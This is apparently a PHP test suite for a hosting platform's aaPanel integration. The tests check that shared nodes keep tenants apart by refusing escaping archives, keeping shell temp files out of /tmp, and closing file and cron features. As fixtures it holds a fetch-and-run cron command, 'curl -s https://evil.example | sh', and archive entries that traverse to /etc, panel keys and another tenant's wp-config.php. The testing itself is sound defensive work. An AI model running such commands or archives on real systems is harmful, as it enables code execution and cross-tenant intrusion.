<?php

declare(strict_types=1);

use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Http;
use Onhost\Domain\Provisioning\Models\ProviderInstance;
use Onhost\Domain\Provisioning\ProviderRegistry;
use Onhost\Domain\Services\Models\Service;
use Onhost\Platform\Errors\ProviderException;
use Onhost\Providers\AaPanel\AaPanelWebProvider;
use Onhost\Providers\Contracts\Naming;
use Onhost\Providers\Contracts\ResourceRef;
use Onhost\Providers\Shell\ScriptedShell;

/*
 * A shared aaPanel node keeps its tenants apart (TASK-0034, permission program IF-7 / D11 / P0-03, exploit PA-02).
 *
 * aaPanel's file API and ExecShell run as ROOT, and every site on the node runs as the same `www`. So:
 *  - an archive unpacked by the panel (UnZip, as root) that carries a symlink out of the site, a hardlink, an absolute
 *    name or `..` wrote wherever it pointed — another customer's site, /etc, the panel's own keys;
 *  - the node shell's output and exit files, and the chunks of a download, sat in /tmp, readable by every tenant's PHP;
 *  - on a node that serves several customers, the in-panel file manager and shell cron are root I/O a tenant can steer
 *    through a link it planted. They are closed there by the operator (`operator:aapanel:tenancy --apply`), not
 *    engineered around: SFTP stays, and so do the jobs that already run as the site's own user.
 */

afterEach(function () {
    AaPanelWebProvider::$shellFactory = null;
});

/** Records every panel call; answers from `$answers` (needle => response), otherwise a plain success. */
function tenancyPanelFake(array &$calls, array $answers = []): void
{
    Http::fake(function ($request) use (&$calls, $answers) {
        $url = $request->url();
        $path = (string) parse_url($url, PHP_URL_PATH).'?'.(string) parse_url($url, PHP_URL_QUERY);
        $body = $request->data();
        $calls[] = [$path, $body];
        foreach ($answers as $needle => $answer) {
            if (str_contains($path, $needle)) {
                return Http::response($answer instanceof Closure ? $answer($body) : $answer);
            }
        }

        return Http::response(['status' => true, 'msg' => 'ok']);
    });
}

function tenancySite(): ResourceRef
{
    return new ResourceRef('site', '41', 'aapanel-managed01', ['name' => 'shop.cz', 'path' => '/www/wwwroot/shop.cz'], 'srv_tenancy');
}

/** Close (or reopen) the lab instance the way `--apply` records it: an option on the instance row. */
function tenancySetClosed(bool $closed): void
{
    $instance = ProviderInstance::query()->where('key', 'aapanel-managed01')->firstOrFail();
    $instance->forceFill(['options' => array_merge((array) $instance->options, ['tenancy' => ['closed' => $closed]])])->save();
}

/** @param list<array{0:string,1:mixed}> $calls */
function tenancyCalled(array $calls, string $needle): bool
{
    return collect($calls)->contains(fn ($c) => str_contains($c[0], $needle));
}

/** A tar report as the node-side preflight prints it (see AaPanelArchivePreflight). */
function tenancyTarShell(string $report): ScriptedShell
{
    return new ScriptedShell(['/--numeric-owner -tzvf/' => $report, '/unzip -Zs/' => $report]);
}

// ── the archive preflight: a security fix that applies on every node ─────────────────────────────────────────────

dataset('escaping archives', [
    'a symlink out of the site with a file beneath it' => ['site.tar.gz', "N 3 3\nT - 1\nT d 1\nT l 1\nL evil\t/etc\nU evil/cron.d/backdoor\n"],
    'a symlink to another customer (relative)' => ['site.tar.gz', "N 1 1\nT l 1\nL up\t../../other.cz/wp-config.php\n"],
    'a symlink to the panel (absolute)' => ['site.tar.gz', "N 1 1\nT l 1\nL keys\t/www/server/panel/config\n"],
    'a hardlink' => ['site.tar.gz', "N 2 2\nT - 1\nT h 1\n"],
    'a device node' => ['site.tar.gz', "N 1 1\nT c 1\n"],
    'an absolute name' => ['site.tar.gz', "N 1 1\nT - 1\nB /etc/cron.d/backdoor\n"],
    'a .. name' => ['site.tar.gz', "N 1 1\nT - 1\nB ../other.cz/index.php\n"],
    'a symlink in a zip' => ['site.zip', "N 1 1\nT l 1\n"],
    'a zip with a .. name' => ['site.zip', "N 1 1\nT - 1\nB ..\\other.cz\\index.php\n"],
    'a listing that does not add up' => ['site.tar.gz', "N 5 4\nT - 4\n"],
    'an archive the node cannot read' => ['site.tar.gz', "ERR\n"],
]);

it('refuses to unpack an archive whose entries would land outside the site, before the panel unpacks anything as root', function (string $archive, string $report) {
    $calls = [];
    tenancyPanelFake($calls);
    AaPanelWebProvider::$shellFactory = fn () => tenancyTarShell($report);
    $adapter = aaToolsAdapter();

    expect(fn () => $adapter->transport(tenancySite())->extract($archive, 'restore'))->toThrow(ProviderException::class);
    expect(tenancyCalled($calls, 'UnZip'))->toBeFalse(); // nothing reached the root file API
})->with('escaping archives');

it('still unpacks an ordinary site archive, links inside the site included (Laravel storage link, release switch)', function () {
    $calls = [];
    tenancyPanelFake($calls);
    $shell = tenancyTarShell("N 6 6\nT - 3\nT d 1\nT l 2\nL public/storage\t/www/wwwroot/shop.cz/storage/app/public\nL current\treleases/1\n");
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();

    $adapter->transport(tenancySite())->extract('site.tar.gz', '.');

    $unzip = collect($calls)->last(fn ($c) => str_contains($c[0], 'UnZip'));
    expect($unzip)->not->toBeNull()->and($unzip[1]['sfile'])->toBe('/www/wwwroot/shop.cz/site.tar.gz')->and($unzip[1]['dfile'])->toBe('/www/wwwroot/shop.cz');
    // the entries were listed by the node before the panel unpacked the archive, as root, from a place no tenant can read
    expect($shell->ran('--numeric-owner -tzvf'))->toBeTrue()->and($shell->ran('/root/.onhost-shell'))->toBeTrue();
});

// ── temp files of the node shell: a security fix that applies on every node ─────────────────────────────────────

it('keeps the output and exit files of the node shell where only root can read them, never in /tmp', function () {
    $calls = [];
    $lastShell = '';
    Http::fake(function ($request) use (&$calls, &$lastShell) {
        $q = (string) parse_url($request->url(), PHP_URL_QUERY);
        $body = $request->data();
        $calls[] = [$q, $body];
        if ($q === 'action=ExecShell') {
            $lastShell = (string) ($body['shell'] ?? '');

            return Http::response(['status' => true, 'msg' => 'Command sent']);
        }
        if ($q === 'action=GetFileBody') {
            return Http::response(['status' => true, 'data' => str_ends_with((string) $body['path'], '.exit') ? '0' : "hello\n"]);
        }

        return Http::response(['status' => false, 'msg' => "unexpected {$q}"]);
    });
    $adapter = aaToolsAdapter();

    expect(trim($adapter->shell(tenancySite())->run('echo hello', ['user' => 'www'])->stdout))->toBe('hello');

    $exec = collect($calls)->filter(fn ($c) => $c[0] === 'action=ExecShell')->map(fn ($c) => (string) $c[1]['shell'])->values();
    expect($exec[0])->not->toContain('/tmp/onhost-')->toContain('mkdir -p -m 700 /root/.onhost-shell')->toContain('> /root/.onhost-shell/onhost-');
    expect($exec->last())->toStartWith('rm -f /root/.onhost-shell/onhost-');
    $read = collect($calls)->filter(fn ($c) => $c[0] === 'action=GetFileBody')->map(fn ($c) => (string) $c[1]['path']);
    expect($read->every(fn ($p) => str_starts_with($p, '/root/.onhost-shell/')))->toBeTrue();
});

it('stages the chunks of a download and the files of a restore where only root can read them', function () {
    $calls = [];
    tenancyPanelFake($calls, [
        'GetFileBody' => ['status' => true, 'data' => base64_encode('hello')],
        'data?action=getData&table=backup' => ['data' => [['id' => 77, 'addtime' => '2026-09-10 02:30:00', 'size' => 1234, 'filename' => '/www/backup/site/shop.cz_20260910.zip']]],
    ]);
    $shell = new ScriptedShell(['/^stat -c/' => "5\n", '/unzip -Zs/' => "N 2 2\nT - 1\nT d 1\n"]);
    AaPanelWebProvider::$shellFactory = fn () => $shell;
    $adapter = aaToolsAdapter();
    $local = tempnam(sys_get_temp_dir(), 'tenancy');

    try {
        $adapter->transport(tenancySite())->download('wp-config.php', $local);
        expect(file_get_contents($local))->toBe('hello');
    } finally {
        @unlink($local);
    }
    $chunk = collect($shell->commands())->first(fn ($c) => str_contains($c, 'base64 -w0'));
    expect($chunk)->not->toContain('/tmp/')->toContain('> /root/.onhost-shell/dl-');
    expect(collect($calls)->first(fn ($c) => str_contains($c[0], 'GetFileBody'))[1]['path'])->toStartWith('/root/.onhost-shell/dl-');

    $adapter->restoreFromArchive(tenancySite(), '77');
    $restore = collect($shell->commands())->first(fn ($c) => str_contains($c, 'unzip -oq'));
    expect($restore)->not->toContain('/tmp/')->toContain('/root/.onhost-shell/restore-');
    expect($shell->ran('unzip -Zs'))->toBeTrue(); // the panel's archive is listed before it is unpacked, too
});

// ── the tenancy switch: only on a node the operator closed ─────────────────────────────────────────────────────

it('closes the in-panel file manager and new shell cron on a node the operator closed, with the reason', function () {
    $calls = [];
    tenancyPanelFake($calls, [
        'crontab?action=GetCrontab' => [['id' => 12, 'name' => Naming::cronLabel('srv_tenancy', 'cache'), 'type' => 'day', 'where_hour' => '3', 'where_minute' => '0', 'sBody' => 'php cron.php', 'status' => 1]],
    ]);
    AaPanelWebProvider::$shellFactory = fn () => new ScriptedShell(['/^id -u /' => "1042\n"]);
    $adapter = aaToolsAdapter();
    $site = tenancySite();
    tenancySetClosed(true);

    $features = $adapter->siteFeatures();
    expect($features['files'])->toBeFalse()->and($features['file_manager'])->toBeFalse()->and($features['files_advanced'])->toBeFalse()
        ->and($features['ftp'])->toBeTrue()->and($features['cron'])->toBeTrue(); // SFTP/FTP stays; jobs can still be listed and deleted

    foreach ([
        fn () => $adapter->writeFile($site, 'index.php', '<?php echo 1;'),
        fn () => $adapter->deleteFile($site, 'index.php'),
        fn () => $adapter->createDirectory($site, 'new'),
        fn () => $adapter->listFiles($site, ''),
        fn () => $adapter->readFile($site, 'wp-config.php'),
        fn () => $adapter->createCron($site, ['schedule' => '0 3 * * *', 'command' => 'php artisan schedule:run']),
        fn () => $adapter->updateCron($site, '12', ['command' => 'curl -s https://evil.example | sh']),
        fn () => $adapter->runCron($site, '12'),
    ] as $closed) {
        try {
            $closed();
            $this->fail('a closed shared node took the request');
        } catch (ProviderException $e) {
            expect($e->getMessage())->toContain('SFTP');
        }
    }
    foreach (['SaveFileBody', 'CreateFile', 'DeleteFile', 'CreateDir', 'GetDir', 'GetFileBody', 'AddCrontab', 'modify_crond', 'StartTask'] as $action) {
        expect(tenancyCalled($calls, $action))->toBeFalse("{$action} reached the panel");
    }

    // what stays: re-confining a job with the command it already has, pausing, deleting (the ways out)
    $adapter->updateCron($site, '12', ['command' => 'php cron.php']);
    expect(tenancyCalled($calls, 'modify_crond'))->toBeTrue();
    $adapter->setCronActive($site, '12', false);
    expect(tenancyCalled($calls, 'set_cron_status'))->toBeTrue();
    $adapter->deleteCron($site, '12');
    expect(tenancyCalled($calls, 'DelCrontab'))->toBeTrue();
});

it('leaves a node nobody closed exactly as it was', function () {
    $calls = [];
    tenancyPanelFake($calls);
    $adapter = aaToolsAdapter();

    expect($adapter->siteFeatures())->toMatchArray(['files' => true, 'file_manager' => true, 'files_advanced' => true, 'cron' => true, 'cron_edit' => true]);
    $adapter->writeFile(tenancySite(), 'index.php', '<?php echo 1;');
    expect(tenancyCalled($calls, 'SaveFileBody'))->toBeTrue();
});

it('refuses file writes and uploads through the customer API on a closed shared node', function () {
    Http::preventStrayRequests();
    Http::fake(fn () => Http::response(['status' => true, 'msg' => 'ok']));
    [$user, $org] = $this->customerWithOrganization();
    $service = featureWebService($org, 'aapanel');
    tenancySetClosed(true);
    $this->actingAs($user, 'sanctum');

    $features = $this->getJson("/v1/services/{$service->id}/features")->assertOk()->json('data');
    expect($features['features']['files']['enabled'])->toBeFalse()->and($features['features']['files_advanced']['enabled'])->toBeFalse()
        ->and($features['actions'])->not->toContain('file.save')->not->toContain('file.extract');
    $this->postJson("/v1/services/{$service->id}/actions", ['action' => 'file.save', 'params' => ['path' => 'index.php', 'content' => 'x']], ['Idempotency-Key' => 'tenancy-save'])
        ->assertUnprocessable()->assertJsonPath('error', 'feature_unavailable');
    $this->postJson("/v1/services/{$service->id}/actions", ['action' => 'file.extract', 'params' => ['path' => 'a.zip']], ['Idempotency-Key' => 'tenancy-extract'])
        ->assertUnprocessable()->assertJsonPath('error', 'feature_unavailable');
    $this->post("/v1/services/{$service->id}/files/upload", ['file' => UploadedFile::fake()->create('x.php', 1)], ['Accept' => 'application/json'])
        ->assertUnprocessable()->assertJsonPath('error', 'feature_unavailable');
    Http::assertNotSent(fn ($r) => str_contains($r->url(), 'SaveFileBody') || str_contains($r->url(), 'action=upload') || str_contains($r->url(), 'UnZip'));
});

// ── the operator command ───────────────────────────────────────────────────────────────────────────────────────

/** A second customer's site on the same node (featureWebService binds remote id 41; the row is what counts here). */
function tenancyNeighbour(Service $first, string $organizationId, string $hostname): Service
{
    $second = $first->replicate();
    $second->forceFill(['organization_id' => $organizationId, 'hostname' => $hostname, 'name_prefix' => null])->save();

    return $second;
}

it('lists the aaPanel nodes several customers share and what closing them takes away, changing nothing (dry run)', function () {
    [, $orgA] = $this->customerWithOrganization();
    [, $orgB] = $this->customerWithOrganization(['email' => 'second@example.test'], ['name' => 'Druhá s.r.o.']);
    $first = featureWebService($orgA, 'aapanel');
    tenancyNeighbour($first, $orgB->id, 'other.cz');
    // a node only one customer uses is not shared
    $solo = ProviderInstance::query()->create(['key' => 'aapanel-solo', 'provider' => 'aapanel', 'name' => 'solo', 'region_code' => 'cz1', 'base_url' => 'https://solo.mgmt.test:8888', 'secret_ref' => 'env://AAPANEL_SOLO', 'state' => 'active', 'capabilities' => ['web.create' => true], 'options' => []]);
    $first->replicate()->forceFill(['provider_instance_id' => $solo->id, 'hostname' => 'solo.cz', 'name_prefix' => null])->save();
    $audits = DB::table('audit_events')->count();

    $this->artisan('operator:aapanel:tenancy')
        ->expectsOutputToContain('aapanel-managed01')->expectsOutputToContain('shop.cz')->expectsOutputToContain('other.cz')
        ->expectsOutputToContain('Druhá s.r.o.')->expectsOutputToContain('SFTP')->expectsOutputToContain('--apply')
        ->doesntExpectOutputToContain('solo.cz')->assertExitCode(0);

    expect(ProviderInstance::query()->where('key', 'aapanel-managed01')->first()->option('tenancy.closed'))->toBeNull();
    expect(DB::table('audit_events')->count())->toBe($audits);
});

it('closes the shared nodes on --apply through the command bus, and reopens one on --reopen', function () {
    Http::fake(fn () => Http::response(['status' => true, 'msg' => 'ok']));
    [, $orgA] = $this->customerWithOrganization();
    [, $orgB] = $this->customerWithOrganization(['email' => 'second@example.test']);
    $first = featureWebService($orgA, 'aapanel');
    tenancyNeighbour($first, $orgB->id, 'other.cz');

    $this->artisan('operator:aapanel:tenancy --apply')->expectsOutputToContain('closed')->assertExitCode(0);

    $instance = ProviderInstance::query()->where('key', 'aapanel-managed01')->firstOrFail();
    expect($instance->option('tenancy.closed'))->toBeTrue()->and($instance->option('tenancy.organizations'))->toBe(2)
        ->and($instance->option('verify_tls'))->toBeFalse(); // the other options of the instance are kept
    expect(DB::table('audit_events')->where('action', 'provisioning.instance.upsert')->where('result', 'succeeded')->exists())->toBeTrue();
    app(ProviderRegistry::class)->forget($instance);
    expect(fn () => aaToolsAdapter()->writeFile(tenancySite(), 'index.php', 'x'))->toThrow(ProviderException::class);

    // again: nothing more to do, nothing written twice
    $writes = DB::table('audit_events')->where('action', 'provisioning.instance.upsert')->count();
    $this->artisan('operator:aapanel:tenancy --apply')->expectsOutputToContain('already closed')->assertExitCode(0);
    expect(DB::table('audit_events')->where('action', 'provisioning.instance.upsert')->count())->toBe($writes);

    $this->artisan('operator:aapanel:tenancy --reopen')->assertExitCode(1); // reopening names the node
    $this->artisan('operator:aapanel:tenancy --reopen --instance=aapanel-managed01')->expectsOutputToContain('reopened')->assertExitCode(0);
    expect(ProviderInstance::query()->where('key', 'aapanel-managed01')->first()->option('tenancy.closed'))->toBeFalse();
});
